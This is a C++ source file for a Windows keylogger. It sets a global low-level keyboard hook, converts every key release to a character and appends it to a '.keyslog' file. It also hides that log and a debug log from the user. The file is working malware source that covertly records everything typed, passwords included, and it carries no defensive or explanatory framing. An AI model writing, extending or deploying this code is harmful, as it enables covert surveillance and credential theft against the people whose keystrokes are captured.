#include <string>
#include <fstream>
#include <windows.h>

#include "key_listener_exports.h"
#include "key_listener_internals.h"

using namespace std;

#define KEYLOGGER_FILE_NAME ".keyslog"
#define KEYLOGGER_DEBUG_FILE_NAME ".debuglog"

static KeyListener *g_cMainListener = NULL;

eKLoggerStatus initKLogger(string &sKLogPath)
{
    eKLoggerStatus rc = UNDEFINED;
    if (NULL == g_cMainListener) {
        g_cMainListener = new KeyListener(sKLogPath);
        rc = SUCCESS;
        goto Exit;
    }

    rc = ERROR_INIT_CALLED_MORE_THAN_ONCE;
Exit:
    return rc;
}

eKLoggerStatus beginLogging(void)
{
    eKLoggerStatus rc = UNDEFINED;
    HHOOK keyboardHookHandler;
    HINSTANCE hInstance = GetModuleHandle(NULL);
    MSG message;

    if (NULL == g_cMainListener) {
        rc = ERROR_BEGIN_LOGGING_CALLED_BEFORE_INIT;
        goto Exit;
    }

    keyboardHookHandler = SetWindowsHookEx(
        WH_KEYBOARD_LL,
        fnKeyListenerPressCallbackProc,
        hInstance,
        0
        );

    while (GetMessage(&message, NULL, 0, 0)) {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }

    UnhookWindowsHookEx(keyboardHookHandler);

    rc = SUCCESS;
Exit:
    return rc;
}

static LRESULT CALLBACK fnKeyListenerPressCallbackProc (
    int nCode,
    WPARAM wParam,
    LPARAM lParam
)
{
    g_cMainListener->fnPressCallback(nCode, wParam, lParam);
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

KeyListener::KeyListener (
	string &sKLogPath
	) : m_KeyLogger{sKLogPath, KEYLOGGER_FILE_NAME},
		m_DebugLogger{sKLogPath, KEYLOGGER_DEBUG_FILE_NAME},
        m_baKeysPressed{0}
{
    this->m_KeyLogger.hide();
    this->m_DebugLogger.hide();
}

void KeyListener::fnPressCallback (
    int nCode,
    WPARAM wParam,
    LPARAM lParam
)
{
    KBDLLHOOKSTRUCT *sKeyboardStruct = (KBDLLHOOKSTRUCT *) lParam;
    char currentChar = 0;
    BYTE lpKeyState[256] = {0};

    GetKeyboardState(lpKeyState);

    switch (wParam) {
        case WM_KEYUP:
            ToAscii(sKeyboardStruct->vkCode,
                    sKeyboardStruct->scanCode,
                    lpKeyState,
                    (LPWORD)&currentChar,
                    0);
            m_KeyLogger.logLine(&currentChar, 1);
            break;
    }
}